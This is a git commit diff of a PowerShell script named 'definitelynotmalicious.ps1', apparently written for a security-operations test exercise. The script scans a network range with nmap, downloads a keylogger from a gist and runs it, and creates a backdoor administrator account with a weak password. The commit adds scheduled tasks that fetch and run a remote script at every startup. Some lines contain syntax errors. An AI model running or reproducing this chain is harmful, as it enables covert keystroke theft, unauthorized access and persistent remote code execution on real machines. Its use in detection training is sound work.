d8463df2696efe0ae9e6f9b6cd7ccae19903cbff
mshapiro2025 <90416755+mshapiro2025@users.noreply.github.com>
2023-02-21 11:02:14 -0500

    Update definitelynotmalicious.ps1

--- definitelynotmalicious.ps1
+++ definitelynotmalicious.ps1
@@ -10,8 +10,15 @@ cd C:\Users\setup
 cmd.exe /c nmap-7.93-setup.exe
 cmd.exe /c nmap -T4 -A -v ($nethost + $firstip + "-" + $lastip) -oN netscan
 Invoke-WebRequest https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt -OutFile C:\Users\setup\keylogger.ps1
+Start-Sleep -s 60
 ./keylogger.ps1
 New-LocalUser -Name "newuser" -AccountNeverExpires -Password "password"
 Add-LocalGroupMember -Group "Administrators" -Member "newuser"
-$trigger = New-JobTrigger -AtStartup
-Register-ScheduledTask -FilePath C:\Users\setup\startupscript.ps1 -Trigger $trigger
+Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript?token=GHSAT0AAAAAAB7CSJAA2FHRJCBOR5PGUTPYY7U6YNA -OutFile C"\Users\setup\startupscript.ps1
+$action1 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-File "C:\Users\setup\startupscript.ps1"'
+$action2 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument 'Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript?token=GHSAT0AAAAAAB7CSJAA2FHRJCBOR5PGUTPYY7U6YNA -OutFile C"\Users\setup\startupscript.ps1'
+$trigger1 = New-JobTrigger -AtStartup
+$trigger1.Delay = 'PT1M'
+$trigger2 -New-JobTrigger -AtStartup
+Register-ScheduledTask -Action $action2 -Trigger $trigger2
+Register-ScheduledTask -Action $action1 -Trigger $trigger1
